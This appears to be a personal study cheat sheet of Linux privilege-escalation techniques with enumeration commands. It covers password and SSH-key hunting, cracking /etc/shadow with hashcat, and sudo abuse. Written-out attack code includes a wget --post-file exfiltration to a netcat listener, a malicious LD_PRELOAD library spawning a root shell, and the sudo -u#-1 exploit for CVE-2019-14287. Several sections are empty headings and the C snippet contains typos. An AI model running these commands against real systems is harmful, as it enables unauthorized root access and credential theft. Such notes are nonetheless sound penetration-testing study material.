## Initial Enumeration
**System Enumeration**
- Enumerate the hostname: `hostname`
- Enumerate the kername info
	- `uname -a`
	- `cat /proc/version`
	- `cat /etc/issues` 
- Enumerate the architecture
	- `lscpu`
	- Sometimes the exploit requires multiple threads or multiple cores, so if the exploit requires four cores and the machines has only one, such exploit does not work.
- Enumerate the services
	- `ps aux`
	- What user is running what task or command.
	- Grep the task ran by root user only: `ps aux | grep root`


**User Enumeration**
- Who we are? What permission we have? and what we are capable of?
- Enumerate the id: `id`
- Enumerate the sudo command which a user can run: `sudo -l`
- Enumerate the users: `cat /etc/passwd`
- Check if we can access shadow file: `cat /etc/shadow`
- Check for the history: `history`


**Network Enumeration**
- Identify the open ports: `netstat -ano`
- Analyze the ports open in a localhost.

**Password Hunting**
- Search for the keyword password
	- `grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null`
- Find the filename which contains keyword password
	- `locate password | more`
	- `locate passwd | more`
	- `locate pass | more`

- Enumerate for SSH keys
	- `find / -name id_rsa 2> /dev/null`

## Exploring Automated Tools
- Resources
	- https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
	- https://github.com/rebootuser/LinEnum
	- https://github.com/mzet-/linux-exploit-suggester
	- https://github.com/sleventyeleven/linuxprivchecker

## Kernel Exploits
- Resources
	- https://github.com/lucyoa/kernel-exploits
- Enumerate the kernal version
	- `uname -a`
- Search for the exploit on internet.

## Escalation Path: Passwords and File Permissions
**Stored Password**
- Get information from history 
	- `history`
- Get information from bash history
	- `cat .bash_history`
- Search for the keyword password
	- `grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null`

**Escalation via Weak File Permissions**
- View the read permission on /etc/shadow and /etc/passwd.
- If a user have read permission on both of the file.
- Copy the data from both file and save separately.
- User `unshadow` command from Linux
	- unshadow passwd-file shadow-file
	- Copy the user which have data and save on a file.
- Use Hashcat to decrypt the passwords.
	- `hashcat -m 1800 unshadow.txt rockyou.txt`

**Escalation via SSH Keys**
- Enumerate id rsa (Private Key).
	- `find / -name id_rsa 2> /dev/null`
	- `chmod 600 id_rsa`
	- `ssh -i id_rsa username@IP`

- Enumerate authorized keys (Public key)
	- If the authorized_keys file is writable to the current user, this can be exploited by additing additional authorized keys.
	- `find / -name authorized_keys 2> /dev/null`
	- View the permission of the file.
	- Generate the SSH key
		- `ssh-keygen`
		- It will generate the Key and store on a file.
	- The pulic key can then be copied with the ssh-copy commannd line tool.
		- `ssh-copy-id username@IP`
	- Copy the public key to the authorized_hosts.
	- This allows to login using SSH without having to specify any private keys. (As Linux checks for private keys in the user's home directory by default)
	- `ssh username@IP`

## Escalation Path: Sudo
**Escalation via Sudo Shell Escaping**
- `sudo -l`
- It will list the application or services which can be root as sudo or whether it needs password to run or not.
- Navigate to GTFOBins and search for an application name.
- Click on SUDO and execute commands as per it.

Escalation via Intended Functionality
- With Apache2
	- There is an intented functionality on apache that allows us to view system files.
	- We can get shell and can'tedit system files, but using this, we can view system files.
	- `sudo -l` - If apache2 is listed and does not requires password.
	- `sudo apache2 -f /etc/shadow`
- With Wget
	- set up a netcat listener
		- `nc -lvnp 8001`
	- Send wget commands as such:
		- `sudo wget -post-file=<filename> <ip><port>`

**Escalation via LD_PRELOAD**
- `sudo -l`
	- We can see the environment variable LD_PRELOAD
	- It is a feature of dynamic linker (LD) which is used for preloading the library.
- We are gonna be able to execute our own library and preload that before we run anything.
- We need to make malicious library in order to do it.
- `vim shell.c`
- c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void_init(){
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}` 
- Compile: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
- `sudo LD_PRELOAD=/full/path/shell.so <appname>`
	- Where appname is an ouput of app list from `sudo -l`

**Escalation via CVE-2019-14287**
- Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv -u#-1 returns as 0 which is root's id.
- If we found `username ALL=(ALL:!root) /bin/bash`
- We can escalate the privilege with following:
	- `sudo -u#-1 /bin/bash`
- References: https://www.exploit-db.com/exploits/47502

**Escalation via CVE-2019-18634**
- In Sudo before 1.8.26, if pwfeedback is enabled in /etc/sudoers, users can trigger a stack-based buffer overflow in the privileged sudo process.
- This bug can be triggered even by users not listed in the sudoers file.
- There is no impact unless pwfeedback has been enabled.
- Download the payload from: https://github.com/saleemrashid/sudo-cve-2019-18634
- `./exploit`
- References: https://www.sudo.ws/security/advisories/pwfeedback/

## Escalation Path: SUID
- Find the files owned by root which have SUID.
- `find / -perm -u=s -type f 2>/dev/null`
- `ls -la <path/filename>`
- Navigate to GTFOBin and search for the filename/command.
- Select SUID and exploit as per it.

## Escalation Path: Other SUID Escalation
**Escalation via Shared Object Injection**
- During execution, a program needs to load some shared objects. In this process some system calls are made. We can view the list of these system calls using a program called strace.
- strace: Traces system calls and signals.
- Find  the files with suid bit set
  - `find / -type f -perm -04000 -ls 2>/dev/null`
  - Or, `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
**Escalation via Binary Symlinks**
**Escalation via Environmen Variables**

## Escalation Path: Capabilities

## Escalation Path: Scheduled Tasks

## Escalation Path: NFS Root Squashing

## Escalation Path: Docker
